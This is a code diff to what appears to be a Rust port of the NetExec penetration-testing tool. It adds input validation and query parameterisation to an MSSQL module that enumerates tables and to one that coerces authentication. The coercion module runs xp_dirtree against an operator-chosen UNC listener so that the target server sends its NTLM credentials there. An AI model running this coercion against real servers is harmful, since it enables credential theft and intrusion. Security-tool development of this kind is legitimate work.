@@ -48,9 +48,13 @@ impl NxcModule for MssqlCoerce {
             .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
             .ok_or_else(|| anyhow!("MSSQL session required"))?;
         let listener = opts.get("LISTENER").ok_or_else(|| anyhow!("LISTENER required"))?;
+        if listener.contains('\'') || listener.contains('\\') || listener.contains(';') {
+            return Err(anyhow!("Invalid LISTENER: contains illegal characters"));
+        }
         let proto = nxc_protocols::mssql::MssqlProtocol::new();
-        let sql = format!("EXEC master..xp_dirtree '\\\\{listener}\\share'");
-        let _ = proto.query_json(mssql_sess, &sql).await;
+        let unc_path = format!("\\\\{listener}\\share");
+        let sql = "EXEC master..xp_dirtree @P1";
+        let _ = proto.query_json_with_params(mssql_sess, sql, &[&unc_path]).await;
         let output = format!("MSSQL Coercion on {}:\n  [*] Executed xp_dirtree -> \\\\{}\\share\n  [*] Check your listener for incoming auth\n", mssql_sess.target, listener);
         Ok(ModuleResult {
             success: true,
@@ -101,6 +105,9 @@ impl NxcModule for MssqlDumper {
             .downcast_ref::<nxc_protocols::mssql::MssqlSession>()
             .ok_or_else(|| anyhow!("MSSQL session required"))?;
         let db = opts.get("DB").map(std::string::String::as_str).unwrap_or("master");
+        if db.chars().any(|c| !c.is_alphanumeric() && c != '_' && c != '-') {
+            return Err(anyhow!("Invalid DB name: must be alphanumeric"));
+        }
         let proto = nxc_protocols::mssql::MssqlProtocol::new();
         let sql = format!("SELECT TABLE_NAME FROM {db}.INFORMATION_SCHEMA.TABLES");
         let tables = proto.query_json(mssql_sess, &sql).await.unwrap_or_default();
